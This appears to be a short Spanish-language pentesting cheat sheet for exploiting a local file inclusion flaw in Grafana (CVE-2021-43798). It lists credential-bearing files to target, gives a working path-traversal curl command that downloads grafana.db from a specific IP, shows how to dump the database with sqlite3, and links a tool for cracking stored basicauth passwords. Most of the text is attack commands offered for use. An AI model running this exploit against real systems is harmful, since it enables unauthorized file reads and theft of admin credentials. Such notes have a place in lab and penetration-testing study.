Si encontramos una versión de grafana con LFI:
### Archivos importantes
grafana.ini puede contener info importante como el user y pass del admin

    /etc/grafana/grafana.ini

también tenemos la db:

    /var/lib/grafana/grafana.db

# bajar la db

    curl --path-as-is http://192.168.247.181:3000/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../../../var/lib/grafana/grafana.db -O grafana.db


# dumpear la db con sqlite3.
    sqlite3 file.db

luego:

    .dump


# Crack pass
Si encontramos un basicauthpassword podemos romperlo con

    https://github.com/jas502n/Grafana-CVE-2021-43798

si nos da un error por falta de librerías:

    go mod tidy
